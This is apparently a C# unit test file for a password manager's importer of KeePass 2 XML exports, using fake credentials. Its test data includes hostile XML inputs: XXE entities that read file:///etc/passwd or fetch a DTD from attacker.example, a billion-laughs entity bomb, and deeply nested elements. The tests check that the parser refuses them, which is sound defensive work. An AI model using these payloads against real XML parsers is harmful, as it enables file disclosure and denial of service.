using System.Diagnostics;
using System.Text;
using BitosX.Core.ImportExport;
using static BitosX.Core.Tests.ImportExport.ImportTesting;

namespace BitosX.Core.Tests.ImportExport;

/// <summary>
/// KeePass 2 XML: what is read from it, what is passed over, and the ways a hostile XML file is
/// refused.
/// </summary>
public sealed class KeePassXmlImportTests
{
    private const string RecycleBinUuid = "cmVjeWNsZS1iaW4tdXVpZA==";

    // A database as KeePassXC writes it when it exports XML (tabs, the elements in its order, values
    // of protected fields in plain text and marked ProtectInMemory), with made-up content.
    private const string KeePassXcExport = """
        <?xml version="1.0" encoding="UTF-8" standalone="yes"?>
        <KeePassFile>
        	<Meta>
        		<Generator>KeePassXC</Generator>
        		<DatabaseName>Fake database</DatabaseName>
        		<MemoryProtection>
        			<ProtectTitle>False</ProtectTitle>
        			<ProtectUserName>False</ProtectUserName>
        			<ProtectPassword>True</ProtectPassword>
        			<ProtectURL>False</ProtectURL>
        			<ProtectNotes>False</ProtectNotes>
        		</MemoryProtection>
        		<RecycleBinEnabled>True</RecycleBinEnabled>
        		<RecycleBinUUID>cmVjeWNsZS1iaW4tdXVpZA==</RecycleBinUUID>
        		<HistoryMaxItems>10</HistoryMaxItems>
        	</Meta>
        	<Root>
        		<Group>
        			<UUID>cm9vdC1ncm91cC11dWlkMQ==</UUID>
        			<Name>Root</Name>
        			<Notes/>
        			<IconID>48</IconID>
        			<Times>
        				<LastModificationTime>2026-01-02T03:04:05Z</LastModificationTime>
        				<Expires>False</Expires>
        			</Times>
        			<IsExpanded>True</IsExpanded>
        			<Entry>
        				<UUID>ZW50cnktdXVpZC0wMDAwMQ==</UUID>
        				<IconID>0</IconID>
        				<Tags>work;mail</Tags>
        				<Times>
        					<CreationTime>2025-01-02T03:04:05Z</CreationTime>
        				</Times>
        				<String>
        					<Key>Notes</Key>
        					<Value>first line
        second line</Value>
        				</String>
        				<String>
        					<Key>Password</Key>
        					<Value ProtectInMemory="True">FAKE-kdbx &lt;pw&gt; &amp; "more"</Value>
        				</String>
        				<String>
        					<Key>Title</Key>
        					<Value>Example</Value>
        				</String>
        				<String>
        					<Key>URL</Key>
        					<Value>https://example.com/login</Value>
        				</String>
        				<String>
        					<Key>UserName</Key>
        					<Value>fake.user@example.test</Value>
        				</String>
        				<String>
        					<Key>otp</Key>
        					<Value ProtectInMemory="True">otpauth://totp/Example:fake.user?secret=FAKEFAKEFAKEFAKE</Value>
        				</String>
        				<String>
        					<Key>Recovery code</Key>
        					<Value>FAKE-recovery</Value>
        				</String>
        				<String>
        					<Key>Empty field</Key>
        					<Value/>
        				</String>
        				<AutoType>
        					<Enabled>True</Enabled>
        					<DataTransferObfuscation>0</DataTransferObfuscation>
        					<DefaultSequence/>
        				</AutoType>
        				<History>
        					<Entry>
        						<UUID>ZW50cnktdXVpZC0wMDAwMQ==</UUID>
        						<String>
        							<Key>Password</Key>
        							<Value ProtectInMemory="True">FAKE-older-pw</Value>
        						</String>
        						<String>
        							<Key>Title</Key>
        							<Value>Example, as it was</Value>
        						</String>
        					</Entry>
        				</History>
        			</Entry>
        			<Group>
        				<UUID>Z3JvdXAtdXVpZC0wMDAwMQ==</UUID>
        				<Name>Internet</Name>
        				<Group>
        					<UUID>Z3JvdXAtdXVpZC0wMDAwMg==</UUID>
        					<Name>Shops</Name>
        					<Entry>
        						<UUID>ZW50cnktdXVpZC0wMDAwMg==</UUID>
        						<String>
        							<Key>Title</Key>
        							<Value>Shop</Value>
        						</String>
        						<String>
        							<Key>Password</Key>
        							<Value ProtectInMemory="True">FAKE-shop-pw</Value>
        						</String>
        					</Entry>
        				</Group>
        			</Group>
        			<Group>
        				<UUID>cmVjeWNsZS1iaW4tdXVpZA==</UUID>
        				<Name>Recycle Bin</Name>
        				<Entry>
        					<UUID>ZW50cnktdXVpZC0wMDAwMw==</UUID>
        					<String>
        						<Key>Title</Key>
        						<Value>Deleted</Value>
        					</String>
        				</Entry>
        				<Group>
        					<UUID>Z3JvdXAtdXVpZC0wMDAwMw==</UUID>
        					<Name>Deleted group</Name>
        					<Entry>
        						<UUID>ZW50cnktdXVpZC0wMDAwNA==</UUID>
        						<String>
        							<Key>Title</Key>
        							<Value>Deleted with its group</Value>
        						</String>
        					</Entry>
        				</Group>
        			</Group>
        		</Group>
        		<DeletedObjects>
        			<DeletedObject>
        				<UUID>ZGVsZXRlZC1vYmplY3QtMQ==</UUID>
        				<DeletionTime>2026-01-02T03:04:05Z</DeletionTime>
        			</DeletedObject>
        		</DeletedObjects>
        	</Root>
        </KeePassFile>
        """;

    private static string File(string root, string meta = "")
        => "<?xml version=\"1.0\" encoding=\"utf-8\"?>\n<KeePassFile><Meta>" + meta + "</Meta><Root>" + root + "</Root></KeePassFile>";

    private static string Group(string content, string name = "Root", string uuid = "cm9vdA==")
        => $"<Group><UUID>{uuid}</UUID><Name>{name}</Name>{content}</Group>";

    private static string Entry(params (string Key, string Value)[] strings)
        => "<Entry>" + string.Concat(strings.Select(s => $"<String><Key>{s.Key}</Key><Value>{s.Value}</Value></String>")) + "</Entry>";

    private static ImportEntry OnlyEntry(string entryXml) => Assert.Single(Parse(File(Group(entryXml))).Entries);

    [Fact]
    public void KeePassXc_IsReadAsItWritesIt()
    {
        ParsedImport parsed = Parse(KeePassXcExport);

        Assert.Equal(ImportFormat.KeePassXml, parsed.Format);
        Assert.Equal("KeePass 2 (XML)", parsed.Label);
        Assert.Equal(4, parsed.RecordCount);   // the entry in the history is not one
        Assert.Equal(2, parsed.InTrash);
        Assert.Empty(parsed.Unsupported);
        Assert.Empty(parsed.IgnoredColumns);

        Assert.Collection(
            parsed.Entries,
            first =>
            {
                Assert.Equal(1, first.Position);
                Assert.Equal("Example", first.Name);
                Assert.Equal("fake.user@example.test", first.Username);
                Assert.Equal("FAKE-kdbx <pw> & \"more\"", first.Password);
                Assert.Equal(["https://example.com/login"], first.Addresses);
                Assert.Equal("first line\nsecond line", first.Notes);
                Assert.Equal(string.Empty, first.Folder); // in the root group, which is the database itself
                Assert.Equal(string.Empty, first.Totp);
                Assert.False(first.Favorite);
                Assert.Null(first.Problem);

                // Every other string is a custom field, the authenticator key among them.
                Assert.Equal(
                    [
                        ("otp", "otpauth://totp/Example:fake.user?secret=FAKEFAKEFAKEFAKE"),
                        ("Recovery code", "FAKE-recovery"),
                        ("Empty field", ""),
                    ],
                    first.CustomFields.Select(f => (f.Name, f.Value)));
            },
            second =>
            {
                Assert.Equal(2, second.Position);
                Assert.Equal("Shop", second.Name);
                Assert.Equal("FAKE-shop-pw", second.Password);
                Assert.Equal("Internet/Shops", second.Folder);
                Assert.Empty(second.Addresses);
            });
    }

    [Fact]
    public void OnlyTheFiveStandardKeys_AreFields_AndTheyAreCaseSensitive()
    {
        ImportEntry entry = OnlyEntry(Entry(
            ("Title", "the title"), ("UserName", "the user"), ("Password", "FAKE-pw"), ("URL", "https://example.com"), ("Notes", "the notes"),
            ("title", "lower"), ("Username", "other case"), ("PASSWORD", "FAKE-upper"), ("Url", "x"), ("notes", "y"), (" Title ", "spaced")));

        Assert.Equal("the title", entry.Name);
        Assert.Equal("the user", entry.Username);
        Assert.Equal("FAKE-pw", entry.Password);
        Assert.Equal(["https://example.com"], entry.Addresses);
        Assert.Equal("the notes", entry.Notes);
        Assert.Equal(
            ["title", "Username", "PASSWORD", "Url", "notes", "Title"],
            entry.CustomFields.Select(f => f.Name)); // a custom field's name is trimmed
        Assert.Null(entry.Problem);
    }

    [Fact]
    public void AnEntryWithoutStrings_IsAnEntryWithNothingInIt()
    {
        ParsedImport parsed = Parse(File(Group("<Entry/><Entry></Entry><Entry><UUID>eA==</UUID><Times/></Entry>")));

        Assert.Equal(3, parsed.Entries.Count);
        Assert.All(parsed.Entries, entry =>
        {
            Assert.Equal(string.Empty, entry.Name);
            Assert.Equal(string.Empty, entry.Password);
            Assert.Empty(entry.Addresses);
            Assert.Empty(entry.CustomFields);
        });
    }

    [Fact]
    public void AStandardFieldTwice_MarksTheEntry_AndTheFirstValueIsTheOneKept()
    {
        ParsedImport parsed = Parse(File(Group(
            Entry(("Title", "One"), ("Password", "FAKE-first"), ("Password", "FAKE-second")) +
            Entry(("Title", "Two"), ("Custom", "a"), ("Custom", "b")))));

        Assert.Equal(ImportReason.FieldTwice, parsed.Entries[0].Problem);
        Assert.Equal("FAKE-first", parsed.Entries[0].Password);

        // A custom field may occur any number of times.
        Assert.Null(parsed.Entries[1].Problem);
        Assert.Equal(["a", "b"], parsed.Entries[1].CustomFields.Select(f => f.Value));
    }

    [Fact]
    public void AStringWithoutAKey_IsPassedOver_AndOneWithoutAValueIsEmpty()
    {
        ImportEntry entry = OnlyEntry(
            "<Entry><String><Value>no key</Value></String><String><Key>Title</Key></String><String><Key>Lonely</Key></String>" +
            "<String><Key>Password</Key><Key>Ignored second key</Key><Value>FAKE-pw</Value><Value>ignored second value</Value></String></Entry>");

        Assert.Equal(string.Empty, entry.Name);
        Assert.Equal("FAKE-pw", entry.Password);
        Assert.Equal([("Lonely", "")], entry.CustomFields.Select(f => (f.Name, f.Value)));
    }

    [Fact]
    public void AValue_IsTakenExactlyAsItIs()
    {
        ImportEntry entry = OnlyEntry(
            "<Entry>" +
            "<String><Key>Password</Key><Value>  spaces kept  </Value></String>" +
            "<String><Key>UserName</Key><Value>   </Value></String>" +
            "<String><Key>Title</Key><Value><![CDATA[<b>cdata</b> & more]]> and text<!-- a comment -->, joined</Value></String>" +
            "<String><Key>Notes</Key><Value>a&#x9;tab, a &#xE9;, a &#x1F600; and &quot;quotes&apos;</Value></String>" +
            "</Entry>");

        Assert.Equal("  spaces kept  ", entry.Password);
        Assert.Equal("   ", entry.Username);
        Assert.Equal("<b>cdata</b> & more and text, joined", entry.Name);
        Assert.Equal("a\ttab, a " + (char)0xE9 + ", a " + char.ConvertFromUtf32(0x1F600) + " and \"quotes'", entry.Notes);
    }

    [Fact]
    public void LineEnds_AreWhatXmlMakesOfThem()
    {
        // XML reads CR LF and a lone CR as LF; a CR written as a character reference stays one.
        ImportEntry entry = OnlyEntry("<Entry><String><Key>Notes</Key><Value>a\r\nb\rc\nd&#13;e</Value></String></Entry>");

        Assert.Equal("a\nb\nc\nd\re", entry.Notes);
    }

    [Fact]
    public void AnElementInsideAValue_IsPassedOver()
    {
        ImportEntry entry = OnlyEntry("<Entry><String><Key>Title</Key><Value>be<b>not this</b>fore</Value></String></Entry>");

        Assert.Equal("before", entry.Name);
    }

    [Fact]
    public void TheFolder_IsThePathOfGroupsBelowTheRootGroup()
    {
        ParsedImport parsed = Parse(File(Group(
            Entry(("Title", "in root")) +
            Group(
                Entry(("Title", "in A")) +
                Group(Entry(("Title", "in A/B")), name: " B ") +
                Group(Entry(("Title", "in A/unnamed")), name: "  ") +
                "<Group>" + Entry(("Title", "before its group's name")) + "<Name>Late</Name></Group>",
                name: "A"),
            name: "The database")));

        Assert.Equal(
            [("in root", ""), ("in A", "A"), ("in A/B", "A/B"), ("in A/unnamed", "A"), ("before its group's name", "A/Late")],
            parsed.Entries.Select(e => (e.Name, e.Folder)));
    }

    [Fact]
    public void EveryGroupDirectlyInRoot_IsARootGroup()
    {
        ParsedImport parsed = Parse(File(
            Group(Entry(("Title", "one")), name: "First") + Group(Group(Entry(("Title", "two")), name: "Sub"), name: "Second")));

        Assert.Equal([("one", ""), ("two", "Sub")], parsed.Entries.Select(e => (e.Name, e.Folder)));
    }

    [Fact]
    public void EntriesOutsideAGroup_AndASecondRootOrMeta_AreNotRead()
    {
        ParsedImport parsed = Parse(
            "<KeePassFile>" + Entry(("Title", "directly in the file")) +
            "<Meta><RecycleBinUUID>first</RecycleBinUUID><RecycleBinUUID>second</RecycleBinUUID></Meta>" +
            "<Root>" + Entry(("Title", "directly in Root")) + Group(Entry(("Title", "kept")) + Group(Entry(("Title", "binned?")), uuid: "second")) + "</Root>" +
            "<Root>" + Group(Entry(("Title", "in a second Root"))) + "</Root>" +
            "<Meta><RecycleBinUUID>second</RecycleBinUUID></Meta>" +
            "</KeePassFile>");

        // The first Meta's first RecycleBinUUID counts, so the group "second" is no recycle bin.
        Assert.Equal(["kept", "binned?"], parsed.Entries.Select(e => e.Name));
        Assert.Equal(0, parsed.InTrash);
    }

    // ---- The recycle bin and the history ----

    [Fact]
    public void TheRecycleBin_IsTheGroupTheFileNames_WhereverItIs_AndWhateverItIsCalled()
    {
        string meta = $"<RecycleBinEnabled>False</RecycleBinEnabled><RecycleBinUUID> {RecycleBinUuid} </RecycleBinUUID>";
        ParsedImport parsed = Parse(File(
            Group(
                Entry(("Title", "kept")) +
                Group(
                    Group(Entry(("Title", "binned")) + Group(Entry(("Title", "binned deeper"))), name: "Papierkorb", uuid: RecycleBinUuid),
                    name: "Recycle Bin", // only a name: the bin is the group with the UUID
                    uuid: "bm90LXRoZS1iaW4=")),
            meta));

        Assert.Equal("kept", Assert.Single(parsed.Entries).Name);
        Assert.Equal(2, parsed.InTrash);
        Assert.Equal(3, parsed.RecordCount);
    }

    [Fact]
    public void TheRecycleBin_IsFoundEvenIfMetaComesAfterRoot()
    {
        ParsedImport parsed = Parse(
            "<KeePassFile><Root>" + Group(Entry(("Title", "kept")) + Group(Entry(("Title", "binned")), uuid: RecycleBinUuid)) + "</Root>" +
            $"<Meta><RecycleBinUUID>{RecycleBinUuid}</RecycleBinUUID></Meta></KeePassFile>");

        Assert.Equal("kept", Assert.Single(parsed.Entries).Name);
        Assert.Equal(1, parsed.InTrash);
    }

    [Theory]
    [InlineData("")]
    [InlineData("<RecycleBinUUID/>")]
    [InlineData("<RecycleBinUUID>AAAAAAAAAAAAAAAAAAAAAA==</RecycleBinUUID>")]
    [InlineData("<RecycleBinUUID>c29tZS1vdGhlci1ncm91cA==</RecycleBinUUID>")]
    public void WithoutARecycleBin_NothingIsInIt(string meta)
    {
        // Sixteen zero bytes are how both applications write "none"; a group may have that UUID too.
        ParsedImport parsed = Parse(File(Group(Group(Entry(("Title", "kept")), uuid: "AAAAAAAAAAAAAAAAAAAAAA==") + "<Group>" + Entry(("Title", "also kept")) + "</Group>"), meta));

        Assert.Equal(2, parsed.Entries.Count);
        Assert.Equal(0, parsed.InTrash);
    }

    [Fact]
    public void TheHistoryOfAnEntry_IsNeitherReadNorCounted()
    {
        string history = "<History>" + string.Concat(Enumerable.Repeat(Entry(("Title", "old"), ("Password", "FAKE-old")), 50)) + "</History>";
        ParsedImport parsed = Parse(File(Group("<Entry><String><Key>Title</Key><Value>current</Value></String>" + history + "</Entry>")));

        Assert.Equal("current", Assert.Single(parsed.Entries).Name);
        Assert.Equal(1, parsed.RecordCount);
    }

    // ---- What a plain export is, and what is not one ----

    [Theory]
    [InlineData("ProtectInMemory=\"True\"")]
    [InlineData("ProtectInMemory=\"False\"")]
    [InlineData("Protected=\"False\"")]
    [InlineData("Protected=\"\"")]
    [InlineData("Protected=\"no\"")]
    [InlineData("Other=\"True\"")]
    public void AValueMarkedAsProtectedInMemory_IsPlainText(string attribute)
    {
        ImportEntry entry = OnlyEntry($"<Entry><String><Key>Password</Key><Value {attribute}>FAKE-plain</Value></String></Entry>");

        Assert.Equal("FAKE-plain", entry.Password);
    }

    [Theory]
    [InlineData("True")]
    [InlineData("true")]
    [InlineData("TRUE")]
    [InlineData("1")]
    public void AValueMarkedAsProtected_MeansTheFileIsStillEncrypted_AndIsRefused(string value)
    {
        string text = File(Group(
            Entry(("Title", "plain")) +
            $"<Entry><String><Key>Password</Key><Value Protected=\"{value}\">RkFLRS1lbmNyeXB0ZWQ=</Value></String></Entry>"));

        var refused = Assert.Throws<ImportRefusedException>(() => Parse(text));
        Assert.Equal(ImportRefusal.ProtectedValues, refused.Kind);
        Assert.Contains("plain XML", refused.Message, StringComparison.Ordinal);
    }

    [Theory]
    [InlineData("<Meta><Binaries><Binary ID=\"0\" Protected=\"True\">RkFLRQ==</Binary></Binaries></Meta><Root/>")]
    [InlineData("<Root><Group><Entry><History><Entry><String><Key>Password</Key><Value Protected=\"True\"/></String></Entry></History></Entry></Group></Root>")]
    [InlineData("<Root><Group><Entry><Binary><Key>file</Key><Value Protected=\"1\"/></Binary></Entry></Group></Root>")]
    [InlineData("<Anything Protected=\"True\"/>")]
    public void TheMark_IsRefusedOnAnyElement_ReadOrNot(string content)
    {
        Assert.Equal(ImportRefusal.ProtectedValues, RefusalOf("<KeePassFile>" + content + "</KeePassFile>"));
    }

    // ---- Document type declarations and entities ----

    public static TheoryData<string, string> WithDoctype => new()
    {
        { "an internal entity", "<?xml version=\"1.0\"?><!DOCTYPE KeePassFile [<!ENTITY x \"expanded\">]><KeePassFile><Root><Group><Entry><String><Key>Title</Key><Value>&x;</Value></String></Entry></Group></Root></KeePassFile>" },
        { "an external entity", "<!DOCTYPE KeePassFile [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><KeePassFile><Root><Group><Entry><String><Key>Notes</Key><Value>&xxe;</Value></String></Entry></Group></Root></KeePassFile>" },
        { "an external subset", "<!DOCTYPE KeePassFile SYSTEM \"https://attacker.example/evil.dtd\"><KeePassFile/>" },
        { "a public identifier", "<!DOCTYPE KeePassFile PUBLIC \"-//x//y//EN\" \"file:///etc/passwd\"><KeePassFile/>" },
        { "a parameter entity", "<!DOCTYPE a [<!ENTITY % p SYSTEM \"https://attacker.example/p\"> %p;]><KeePassFile/>" },
        { "an empty declaration", "<!DOCTYPE KeePassFile><KeePassFile/>" },
        { "in lower case", "<!doctype KeePassFile><KeePassFile/>" },
        { "after a comment", "<!-- harmless --><!DOCTYPE KeePassFile []><KeePassFile/>" },
        { "inside a comment", "<KeePassFile><!-- <!DOCTYPE x> --></KeePassFile>" },
        { "inside a CDATA section", "<KeePassFile><Root><Group><Entry><String><Key>Notes</Key><Value><![CDATA[<!DOCTYPE html>]]></Value></String></Entry></Group></Root></KeePassFile>" },
        { "at the very end", "<KeePassFile/><!DOCTYPE x>" },
    };

    [Theory]
    [MemberData(nameof(WithDoctype))]
    public void AnyDocumentTypeDeclaration_IsRefused(string what, string text)
    {
        var refused = Assert.Throws<ImportRefusedException>(() => Parse(text));

        Assert.True(refused.Kind == ImportRefusal.Doctype, what);
    }

    [Fact]
    public void ABillionLaughs_IsRefusedBeforeAnythingIsExpanded()
    {
        var text = new StringBuilder("<?xml version=\"1.0\"?><!DOCTYPE lolz [<!ENTITY lol \"lol\">");
        for (int i = 1; i <= 9; i++)
        {
            string previous = i == 1 ? "lol" : "lol" + (i - 1);
            text.Append("<!ENTITY lol" + i + " \"").Append(string.Concat(Enumerable.Repeat("&" + previous + ";", 10))).Append("\">");
        }

        text.Append("]><KeePassFile><Root><Group><Entry><String><Key>Notes</Key><Value>&lol9;</Value></String></Entry></Group></Root></KeePassFile>");

        var watch = Stopwatch.StartNew();
        Assert.Equal(ImportRefusal.Doctype, RefusalOf(text.ToString()));
        watch.Stop();

        Assert.True(watch.Elapsed < TimeSpan.FromSeconds(2), $"Took {watch.Elapsed}.");
    }

    [Fact]
    public void TheWordsAsEscapedText_AreJustText()
    {
        // What a note that mentions a doctype looks like in a file an application wrote.
        ImportEntry entry = OnlyEntry("<Entry><String><Key>Notes</Key><Value>&lt;!DOCTYPE html&gt; and &amp;entity; too</Value></String></Entry>");

        Assert.Equal("<!DOCTYPE html> and &entity; too", entry.Notes);
    }

    [Theory]
    [InlineData("<KeePassFile><Root><Group><Entry><String><Key>Title</Key><Value>&undeclared;</Value></String></Entry></Group></Root></KeePassFile>")]
    [InlineData("<KeePassFile><Meta>&nbsp;</Meta></KeePassFile>")]
    public void AnEntityThatIsNotOneOfXmlsOwn_IsDamagedXml(string text)
    {
        Assert.Equal(ImportRefusal.InvalidXml, RefusalOf(text));
    }

    [Fact]
    public void XmlsOwnEntities_InAnyNumber_AreRead()
    {
        string value = string.Concat(Enumerable.Repeat("&amp;&lt;&gt;&quot;&apos;&#65;&#x42;", 20_000));
        ImportEntry entry = OnlyEntry($"<Entry><String><Key>Notes</Key><Value>{value}</Value></String></Entry>");

        Assert.Equal(20_000 * 7, entry.Notes.Length);
        Assert.StartsWith("&<>\"'AB&<", entry.Notes, StringComparison.Ordinal);
    }

    // ---- Damaged and foreign XML ----

    [Theory]
    [InlineData("<KeePassFile>")]
    [InlineData("<KeePassFile><Root></KeePassFile>")]
    [InlineData("<KeePassFile></keepassfile>")]
    [InlineData("<KeePassFile/><KeePassFile/>")]
    [InlineData("<KeePassFile/>trailing text")]
    [InlineData("<KeePassFile attribute=noquotes/>")]
    [InlineData("<KeePassFile a=\"1\" a=\"2\"/>")]
    [InlineData("<KeePassFile><Root><Group><Name>a < b</Name></Group></Root></KeePassFile>")]
    [InlineData("<KeePassFile><Root><Group><Name>a & b</Name></Group></Root></KeePassFile>")]
    [InlineData("<KeePassFile><x:Element/></KeePassFile>")]
    [InlineData("<KeePassFile><Root><Group><Name>&#0;</Name></Group></Root></KeePassFile>")]
    [InlineData("<KeePassFile><Root><Group><Name>&#xD800;</Name></Group></Root></KeePassFile>")]
    [InlineData("<KeePassFile><Root><Group><Name>&#xFFFF;</Name></Group></Root></KeePassFile>")]
    [InlineData("<?xml version=\"1.1\"?><KeePassFile/>")]
    [InlineData("<?xml version=\"1.0\"?>")]
    [InlineData("<")]
    [InlineData("<!-- only a comment -->")]
    [InlineData("<?xml version=\"1.0\"?><KeePassFile/><?xml version=\"1.0\"?>")]
    public void DamagedXml_IsRefused(string text)
    {
        Assert.Equal(ImportRefusal.InvalidXml, RefusalOf(text));
    }

    [Fact]
    public void AControlCharacterInAValue_IsDamagedXml()
    {
        // XML has no way to hold these, written out or as a reference; KeePass strips them when it exports.
        Assert.Equal(ImportRefusal.InvalidXml, RefusalOf("<KeePassFile><Meta>a\u0001b</Meta></KeePassFile>"));
        Assert.Equal(ImportRefusal.InvalidXml, RefusalOf("<KeePassFile><Meta>a\u0000b</Meta></KeePassFile>"));
    }

    [Fact]
    public void ARefusalOfXml_DoesNotQuoteTheFile()
    {
        var refused = Assert.Throws<ImportRefusedException>(
            () => Parse("<KeePassFile><Root><Group><Entry><String><Key>Password</Key><Value>FAKE-secret-marker</Wrong></String></Entry></Group></Root></KeePassFile>"));

        Assert.Equal(ImportRefusal.InvalidXml, refused.Kind);
        Assert.DoesNotContain("FAKE-secret-marker", refused.ToString(), StringComparison.Ordinal);
        Assert.DoesNotContain("Wrong", refused.ToString(), StringComparison.Ordinal);
        Assert.Null(refused.InnerException);
    }

    [Theory]
    [InlineData("<html><body>not a password file</body></html>")]
    [InlineData("<keepassfile><Root/></keepassfile>")]
    [InlineData("<Root><Group/></Root>")]
    [InlineData("<kp:KeePassFile xmlns:kp=\"urn:example\"><kp:Root/></kp:KeePassFile>")]
    [InlineData("<?xml version=\"1.0\"?><!-- KeePassFile --><passwords><KeePassFile/></passwords>")]
    public void XmlThatIsNotAKeePassFile_IsNotRecognised(string text)
    {
        Assert.Equal(ImportRefusal.NotRecognised, RefusalOf(text));
    }

    [Fact]
    public void TheEncodingTheFileDeclares_IsNotBelieved_TheBytesAreUtf8()
    {
        byte[] file = Encoding.UTF8.GetBytes(
            "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><KeePassFile><Root><Group><Entry><String><Key>Title</Key><Value>caf\u00E9</Value></String></Entry></Group></Root></KeePassFile>");

        Assert.Equal("caf\u00E9", Assert.Single(Parse(file).Entries).Name);

        // And a file that really is in the encoding it declares is not UTF-8.
        byte[] latin1 = Encoding.Latin1.GetBytes(
            "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><KeePassFile><Root><Group><Name>caf\u00E9</Name></Group></Root></KeePassFile>");
        Assert.Equal(ImportRefusal.InvalidUtf8, RefusalOf(latin1));
    }

    [Fact]
    public void WhiteSpaceBeforeTheDeclaration_AndAByteOrderMark_AreNotPartOfTheDocument()
    {
        byte[] file = [0xEF, 0xBB, 0xBF, .. Encoding.UTF8.GetBytes(" \r\n\t" + File(Group(Entry(("Title", "kept")))) + "\n\n")];

        Assert.Equal("kept", Assert.Single(Parse(file).Entries).Name);
    }

    // ---- Limits ----

    private static string NestedGroups(int levels, string innermost)
        => string.Concat(Enumerable.Repeat("<Group><Name>g</Name>", levels)) + innermost + string.Concat(Enumerable.Repeat("</Group>", levels));

    [Fact]
    public void SixtyFourGroupsInsideOneAnother_AreRead_AndSixtyFiveAreRefused()
    {
        ParsedImport parsed = Parse(File(NestedGroups(64, Entry(("Title", "deep")))));
        ImportEntry entry = Assert.Single(parsed.Entries);
        Assert.Equal(string.Join('/', Enumerable.Repeat("g", 63)), entry.Folder);

        Assert.Equal(ImportRefusal.NestedTooDeeply, RefusalOf(File(NestedGroups(65, Entry(("Title", "too deep"))))));
        Assert.Equal(ImportRefusal.NestedTooDeeply, RefusalOf(File(NestedGroups(65, string.Empty))));
    }

    [Fact]
    public void AHundredElementsInsideOneAnother_AreRead_AndOneMoreIsRefused()
    {
        // KeePassFile and Meta are two levels; these are the rest.
        static string Nested(int levels) => string.Concat(Enumerable.Repeat("<a>", levels)) + string.Concat(Enumerable.Repeat("</a>", levels));

        Assert.Empty(Parse(File(string.Empty, Nested(98))).Entries);
        Assert.Equal(ImportRefusal.NestedTooDeeply, RefusalOf(File(string.Empty, Nested(99))));

        // Also inside something that is passed over, and inside a value.
        Assert.Equal(ImportRefusal.NestedTooDeeply, RefusalOf("<KeePassFile><Unknown>" + Nested(99) + "</Unknown></KeePassFile>"));
        Assert.Equal(
            ImportRefusal.NestedTooDeeply,
            RefusalOf(File(Group("<Entry><String><Key>Title</Key><Value>" + Nested(100) + "</Value></String></Entry>"))));
    }

    [Fact]
    public void TwoMillionElementsInsideOneAnother_AreRefusedAtTheHundredAndFirst()
    {
        // Left to itself, the XML reader keeps a record for every open element: hundreds of megabytes here.
        string deep = "<KeePassFile><Meta>" + string.Concat(Enumerable.Repeat("<a>", 2_000_000));
        long before = GC.GetTotalAllocatedBytes(precise: true);

        var watch = Stopwatch.StartNew();
        Assert.Equal(ImportRefusal.NestedTooDeeply, RefusalOf(deep));
        watch.Stop();

        long allocated = GC.GetTotalAllocatedBytes(precise: true) - before;
        Assert.True(watch.Elapsed < TimeSpan.FromSeconds(5), $"Took {watch.Elapsed}.");
        Assert.True(allocated < 64L * 1024 * 1024, $"Allocated {allocated / (1024 * 1024)} MiB."); // the text itself is 12 MiB
    }

    [Fact]
    public void TenThousandEntries_AreRead_AndOneMoreIsRefused()
    {
        string entry = Entry(("Title", "x"), ("Password", "FAKE-pw"));
        string tenThousand = string.Concat(Enumerable.Repeat(entry, 10_000));

        Assert.Equal(10_000, Parse(File(Group(tenThousand))).Entries.Count);
        Assert.Equal(ImportRefusal.TooManyEntries, RefusalOf(File(Group(tenThousand + entry))));

        // Entries in the recycle bin count; entries in a history do not.
        string binned = Group(string.Concat(Enumerable.Repeat(entry, 5_000)), uuid: RecycleBinUuid);
        string kept = string.Concat(Enumerable.Repeat("<Entry><History>" + entry + entry + "</History></Entry>", 5_000));
        string meta = $"<RecycleBinUUID>{RecycleBinUuid}</RecycleBinUUID>";
        ParsedImport parsed = Parse(File(Group(binned + kept), meta));
        Assert.Equal(5_000, parsed.Entries.Count);
        Assert.Equal(5_000, parsed.InTrash);
        Assert.Equal(ImportRefusal.TooManyEntries, RefusalOf(File(Group(binned + kept + "<Entry/>"), meta)));
    }

    [Fact]
    public void AHugeValue_AndAHugeNumberOfStrings_AreReadInOnePass()
    {
        string huge = new('x', 12 * 1024 * 1024);
        string many = string.Concat(Enumerable.Repeat("<String><Key>k</Key><Value>v</Value></String>", 80_000));
        string text = File(Group($"<Entry><String><Key>Notes</Key><Value>{huge}</Value></String>{many}</Entry>"));

        var watch = Stopwatch.StartNew();
        ImportEntry entry = Assert.Single(Parse(text).Entries);
        watch.Stop();

        Assert.Equal(huge.Length, entry.Notes.Length);
        Assert.Equal(80_000, entry.CustomFields.Count);
        Assert.True(watch.Elapsed < TimeSpan.FromSeconds(10), $"Took {watch.Elapsed}.");
    }
}
